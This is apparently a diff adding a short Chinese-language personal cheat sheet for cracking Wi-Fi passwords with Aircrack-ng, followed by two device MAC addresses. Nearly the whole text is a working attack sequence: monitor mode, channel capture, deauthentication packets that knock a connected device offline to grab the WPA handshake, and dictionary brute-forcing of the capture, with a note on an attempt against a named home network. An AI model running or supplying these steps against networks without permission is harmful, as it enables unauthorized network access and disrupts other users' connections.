@@ -1,0 +1,20 @@
+*********Aircrack-ng 无线破解***********
+
+ifconfig
+# 检查外置网卡
+airmon-ng start wlan0mon
+# 打开外置网卡的监听功能
+airodump-ng wlan0mon
+# 监听数据查看
+airodump-ng --ivs -c 11 -w wifiname wlan0mon
+# 锁定信道及wifi名称进行监听
+aireplay-ng -0 10 -a wifimac -c pcmac wlan0mon
+# 将连接wifi的其中一个设备攻击掉网>>>当该设备重新连接wifi时，即可在监听窗口抓取握手包
+aircrack-ng -w /root/password/ wifimane-*.cap
+# 通过预先准备的密码字典对握手包进行暴力尝试破解
+
+aircrack-ng -w /root/password CU_6pdx-*.cap
+# 这是家里的一个wifi，已经抓到包，但是未破解成功
+
+sony z5c mac：    40:40:A7:B9:5F:EB
+surface kali mac：60:45:BD:E5:8C:C2
